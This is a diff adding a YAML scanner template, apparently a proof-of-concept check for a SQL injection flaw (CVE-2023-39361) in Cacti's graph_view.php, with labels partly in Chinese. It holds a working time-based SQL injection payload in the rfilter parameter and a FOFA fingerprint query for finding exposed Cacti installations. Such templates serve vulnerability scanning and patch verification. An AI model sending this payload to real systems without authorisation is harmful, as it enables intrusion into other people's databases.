@@ -1,0 +1,18 @@
+id: poc-yaml-cacti-graph-view-php-sqli
+info:
+  name: Cacti graph_view.php SQL注入漏洞(CVE-2023-39361)
+  severity: high
+  tags:
+  - CVE-2023-39361
+  - SQL注入
+  finger: cacti
+  fofa: icon_hash="-1797138069"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3D%22%28%28%22%29%29%3BSELECT+SLEEP%28{{.t1}}%29%3B--+-
+  expression: status_code == 200 && contains(body,"cacti") && duration >= t1 && duration
+    < t2
+transport: http
